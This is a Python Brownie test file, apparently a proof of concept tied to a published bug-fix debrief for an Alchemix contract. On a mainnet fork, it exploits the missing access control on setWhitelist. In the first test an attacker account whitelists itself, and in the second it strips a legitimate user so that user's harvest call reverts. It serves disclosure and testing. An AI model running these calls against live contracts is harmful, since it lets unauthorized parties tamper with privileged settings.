"""
Test run on mainnet fork.
PoC of https://medium.com/immunefi/alchemix-access-control-bug-fix-debrief-a13d39b9f2e0
"""
from brownie import accounts, Contract, reverts


def test_alchemist_setwhitelist():
    """
    Test the alchemist vuln.
    The setWhitelist function does not have access control.
    https://etherscan.io/address/0x6b566554378477490ab040f6f757171c967d03ab#code#F1#L358
    Steps:
        - Call the transmuter just to be sure we are calling mainnet-fork.
            Assert 0x8d513E6552aae771CaBD6b2Bf8875A8A2e38f19f
        - The attacker calls the whitelist function to see if it is authorized. Assert False
        - set attacker to the whitelist.
        - The attacker calls the whitelist function to see if it is authorized. Assert True
    """
    attacker_user = accounts[0]
    alchemist = Contract.from_explorer("0x6B566554378477490ab040f6F757171c967D03ab")
    assert alchemist.transmuter() == "0x8d513E6552aae771CaBD6b2Bf8875A8A2e38f19f"
    assert alchemist.whitelist(attacker_user.address) == False
    # Set attacker_user address to whitelist addr
    alchemist.setWhitelist([attacker_user.address], [True], {"from": attacker_user})
    # Check the attacker is in the whitelist
    assert alchemist.whitelist(attacker_user.address) == True


def test_alchemist_harvest():
    """
    Test the alchemist vuln.
    The harvest function will not give access to unauthorized user.
    https://etherscan.io/address/0x6b566554378477490ab040f6f757171c967d03ab#code#F1#L408
    Steps:
        - We have an whitelisted user (0x51e029a5ef288fb87c5e8dd46895c353ad9aaaec) here:
        https://etherscan.io/tx/0x4fa64411ccd2982c43947a54b8e780ea6523da5c7e0c9545bf85697422b21577
        - Set the legit_actor as not whitelisted.
        - Call the harvest function as the legit_actor. Assert revert
    """
    attacker_user = accounts[0]
    legit_actor = "0x51e029a5ef288fb87c5e8dd46895c353ad9aaaec"
    alchemist = Contract.from_explorer("0x6B566554378477490ab040f6F757171c967D03ab")

    alchemist.setWhitelist([legit_actor], [False], {"from": attacker_user})

    with reverts("Alchemist: only whitelist."):
        alchemist.harvest(0, {"from": legit_actor})
